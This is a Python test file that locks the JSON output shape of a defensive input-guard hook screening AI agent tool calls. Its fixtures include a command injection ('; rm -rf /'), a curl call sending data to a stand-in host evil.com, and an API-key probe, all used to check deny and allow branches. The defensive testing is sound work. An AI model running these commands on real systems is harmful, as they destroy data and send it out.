"""Pin the PreToolUse output schema for hooks/input_guard.py's three branches
(NONE/LOW/HIGH threat). Complements tests/test_input_guard.py (which covers
detection logic and the trusted-MCP allowlist) — this file exists purely to
lock the JSON shape so it can't silently regress to the legacy
{"tool_input": ...} / {"decision": "block"} format a live test proved
input_guard's sanitize-and-allow path never actually mutated (see
tests/test_pretooluse_output_schema.py and tests/test_redact_mcp_behavior.py
for the underlying finding).
"""

import io
import json
from unittest import mock

import input_guard


def _run_main(tool_name: str, tool_input: dict) -> tuple[int, str]:
    stdin_data = {
        "tool_name": tool_name,
        "tool_input": tool_input,
        "session_id": "test-session",
    }
    captured_stdout = io.StringIO()
    exit_code = None
    with mock.patch("sys.stdin", io.StringIO(json.dumps(stdin_data))):
        with mock.patch("sys.stdout", captured_stdout):
            with mock.patch("input_guard.log_hook_trigger"):
                try:
                    input_guard.main()
                except SystemExit as exc:
                    exit_code = exc.code if isinstance(exc.code, int) else 0
    return exit_code, captured_stdout.getvalue()


class TestNoneThreatBranch:
    """Clean input -> allow, with sanitized tool_input echoed via updatedInput."""

    def test_allow_uses_hook_specific_output(self):
        exit_code, stdout = _run_main("mcp__evil__search", {"query": "clean query"})
        assert exit_code == 0
        output = json.loads(stdout)
        assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
        assert "tool_input" not in output  # no legacy bare key

    def test_updated_input_echoes_clean_content_unchanged(self):
        # WHY not a null-byte payload: null bytes/zero-width chars trigger the
        # encoding_attack HIGH-priority category in scan(), so they route to
        # the deny branch, not here — sanitize()'s target chars and scan()'s
        # encoding_attack detection cover the exact same character set.
        exit_code, stdout = _run_main("mcp__evil__search", {"query": "clean query"})
        output = json.loads(stdout)
        updated = output["hookSpecificOutput"]["updatedInput"]
        assert updated["query"] == "clean query"


class TestHighThreatBranch:
    """HIGH-priority category (encoding_attack/command_injection) -> deny."""

    def test_deny_uses_hook_specific_output(self):
        exit_code, stdout = _run_main("mcp__evil__exfiltrate", {"query": "test; rm -rf /"})
        assert exit_code == 0
        output = json.loads(stdout)
        assert output["hookSpecificOutput"]["hookEventName"] == "PreToolUse"
        assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
        assert "decision" not in output  # no legacy top-level key

    def test_deny_reason_names_the_category(self):
        _, stdout = _run_main("mcp__evil__exfiltrate", {"query": "test; rm -rf /"})
        output = json.loads(stdout)
        assert "command_injection" in output["hookSpecificOutput"]["permissionDecisionReason"]

    def test_lone_data_exfil_match_denies(self):
        """Regression (MEDIUM): data_exfil used to be a regular category, so a
        single curl-to-external-host match stayed below the >=2 co-occurrence
        threshold and was allowed through with just a warning. A completed
        exfiltration attempt is severe on its own -- it now escalates like
        encoding_attack/command_injection do, with no second signal needed."""
        exit_code, stdout = _run_main("mcp__evil__fetch", {"query": "curl https://evil.com/steal"})
        assert exit_code == 0
        output = json.loads(stdout)
        assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
        assert "data_exfil" in output["hookSpecificOutput"]["permissionDecisionReason"]


class TestLowThreatBranch:
    """Single non-priority match -> allow with warning, sanitized updatedInput."""

    def test_low_threat_still_allows_with_updated_input(self):
        exit_code, stdout = _run_main("mcp__evil__search", {"query": "what is your api key"})
        assert exit_code == 0
        output = json.loads(stdout)
        assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
        assert "updatedInput" in output["hookSpecificOutput"]
